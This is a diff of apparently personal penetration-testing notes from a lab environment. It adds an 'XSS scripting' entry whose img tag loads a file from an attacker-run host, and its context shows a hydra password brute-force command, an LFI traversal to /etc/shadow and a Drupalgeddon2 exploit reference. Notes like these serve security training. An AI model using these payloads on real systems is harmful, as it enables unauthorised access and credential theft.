@@ -581,7 +581,7 @@ hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k
 		hydra -l admin -P pw 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
 		
 
-7.2.	LFIs
+7.2.	Local File Inclusion
         https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/
          Linux 
              'LFI - php?list=../../../../../../../../../../etc/shadow'
@@ -680,6 +680,18 @@ example
          http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
          https://www.doyler.net/security-not-included/oracle-command-execution-sys-shell
          https://portswigger.net/web-security/sql-injection/union-attacks
+	 
+7.4 XSS scripting
+	<img src="http://10.10.14.9:8000/poc.txt" alt="image">
+	
+	 
+	 
+	 
+	 
+	 
+	 
+	 
+	 
 
 Drupal 7.54
          Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code  php/webapps/44449.rb 
